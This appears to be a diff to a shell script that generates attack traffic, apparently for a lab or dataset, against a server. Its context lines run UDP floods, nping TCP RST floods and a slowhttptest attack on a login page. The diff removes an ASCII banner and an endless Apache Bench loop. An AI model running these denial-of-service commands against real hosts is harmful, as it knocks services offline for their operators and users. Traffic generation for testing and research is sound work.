@@ -26,35 +26,6 @@ echo "Running Legitmate DNS Traffic... \r\n "
 sudo ./gen_legit_dns_traffic.sh $server_ip $queries_ps &>/dev/null &
 
 
-echo "
-
-  ______                                                      __      __                     
- /      \                                                    /  |    /  |                    
-/$$$$$$  |  ______   _______    ______    ______   ______   _$$ |_   $$/  _______    ______  
-$$ | _$$/  /      \ /       \  /      \  /      \ /      \ / $$   |  /  |/       \  /      \ 
-$$ |/    |/$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$  |$$$$$$/   $$ |$$$$$$$  |/$$$$$$  |
-$$ |$$$$ |$$    $$ |$$ |  $$ |$$    $$ |$$ |  $$/ /    $$ |  $$ | __ $$ |$$ |  $$ |$$ |  $$ |
-$$ \__$$ |$$$$$$$$/ $$ |  $$ |$$$$$$$$/ $$ |     /$$$$$$$ |  $$ |/  |$$ |$$ |  $$ |$$ \__$$ |
-$$    $$/ $$       |$$ |  $$ |$$       |$$ |     $$    $$ |  $$  $$/ $$ |$$ |  $$ |$$    $$ |
- $$$$$$/   $$$$$$$/ $$/   $$/  $$$$$$$/ $$/       $$$$$$$/    $$$$/  $$/ $$/   $$/  $$$$$$$ |
-                                                                                   /  \__$$ |
-                                                                                   $$    $$/ 
-                                                                                    $$$$$$/  
-
-\r\n
-  ______     __      __                          __                 
- /      \   /  |    /  |                        /  |                
-/$$$$$$  | _$$ |_  _$$ |_     ______    _______ $$ |   __   _______ 
-$$ |__$$ |/ $$   |/ $$   |   /      \  /       |$$ |  /  | /       |
-$$    $$ |$$$$$$/ $$$$$$/    $$$$$$  |/$$$$$$$/ $$ |_/$$/ /$$$$$$$/ 
-$$$$$$$$ |  $$ | __ $$ | __  /    $$ |$$ |      $$   $$<  $$      \ 
-$$ |  $$ |  $$ |/  |$$ |/  |/$$$$$$$ |$$ \_____ $$$$$$  \  $$$$$$  |
-$$ |  $$ |  $$  $$/ $$  $$/ $$    $$ |$$       |$$ | $$  |/     $$/ 
-$$/   $$/    $$$$/   $$$$/   $$$$$$$/  $$$$$$$/ $$/   $$/ $$$$$$$/  
-                                                                    
-                                                                    
-\r\n \r\n
-"
 
 echo "Running UDP Floods... \r\n "
 sudo ./gen_udp_floods.sh $server_ip  &>/dev/null &
@@ -98,11 +69,6 @@ sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -
 echo "Performing a Slow HTTP Test script against webserver \r\n "
 sudo ./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://$server_ip/resources/loginform.html -x 10 -p 3 2> /dev/null &
 
-#---- apache bench attack ----
-echo "Starting a Apache bench strest test... \r\n"
-while true
-do
-    ab -r -c 1000 -n 1000000 $server_ip  &>/dev/null &
-done
+sudo ./gen_ab.sh $server_ip &>/dev/null &
 
 echo "DONE \r\n \r\n"
